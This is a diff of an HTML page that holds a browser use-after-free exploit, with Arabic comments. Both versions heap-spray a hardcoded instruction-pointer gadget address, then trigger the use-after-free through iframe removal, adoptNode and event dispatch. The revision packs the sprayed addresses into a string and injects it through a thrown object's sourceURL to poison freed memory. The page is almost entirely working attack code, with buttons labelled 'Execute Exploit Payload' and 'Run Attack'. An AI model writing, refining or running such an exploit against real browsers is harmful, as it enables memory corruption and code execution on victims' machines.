@@ -1,47 +1,42 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>System Vulnerability Analysis: UAF Payload</h1>
-    <button onclick="executePayload()" style="padding:20px; font-size:20px;">Execute Exploit Payload</button>
+<p>Exploitation Sandbox: Memory Poisoning</p>
+<button onclick="main()">Run Attack</button>
 
-    <script>
-        function executePayload() {
-            // 1. إعداد الـ Heap Spray (تسميم الذاكرة)
-            // سنضع العناوين التي نريد للـ RIP أن يراها في الذاكرة
-            const spraySize = 0x100000; // 1MB
-            const spray = new BigUint64Array(spraySize);
-            const targetAddress = 0x000000082039d566n; // الـ RIP الذي استخرجناه من الـ Dump
-            
-            for (let i = 0; i < spraySize; i++) {
-                spray[i] = targetAddress;
-            }
+<script>
+function main() {
+    // 1. إعداد الـ Payload (العناوين التي نريدها في الذاكرة)
+    const targetGadget = 0x000000082039d566n; 
+    const spraySize = 0x10000;
+    const payload = new BigInt64Array(spraySize);
+    for (let i = 0; i < spraySize; i++) {
+        payload[i] = targetGadget;
+    }
+    // تحويل الـ Array إلى نص (String) ليمكن استخدامه في sourceURL
+    const payloadStr = String.fromCharCode.apply(null, new Uint16Array(payload.buffer));
 
-            // 2. إعداد الـ UAF Trigger
-            const f = document.body.appendChild(document.createElement('iframe'));
-            const a = document.createElement('div');
-            const b = a.appendChild(document.createElement('div'));
+    // 2. إعداد الـ iframe والـ EventTarget كما في الـ PoC الأصلي
+    const f = document.body.appendChild(document.createElement('iframe'));
+    const a = document.createElement('div');
+    const b = a.appendChild(document.createElement('div'));
 
-            // 3. ربط الـ Events لإحداث الـ UAF
-            a.addEventListener('a', eval(`(function () {
-                document.adoptNode(a);
-                f.remove();
-                
-                // هنا نقوم بملء الذاكرة ببياناتنا بدلاً من حرف 'A'
-                throw {
-                    line: 1,
-                    column: 1,
-                    sourceURL: "X".repeat(0x100000) 
-                };
-            })`));
+    a.addEventListener('a', eval(`(function () {
+        document.adoptNode(a);
+        f.remove();
+        // حقن الـ Payload هنا بدلاً من 'A'
+        throw {
+            line: 1, column: 1,
+            sourceURL: payloadStr
+        };
+    })`));
 
-            a.addEventListener('a', () => {});
-            b.addEventListener('a', () => {
-                f.contentDocument.adoptNode(a);
-            });
+    a.addEventListener('a', () => {});
+    b.addEventListener('a', () => { f.contentDocument.adoptNode(a); });
 
-            // 4. تنفيذ الـ Dispatch
-            b.dispatchEvent(new Event('a', { bubbles: true }));
-        }
-    </script>
+    // 3. التنفيذ
+    b.dispatchEvent(new Event('a', { bubbles: true }));
+}
+</script>
 </body>
 </html>
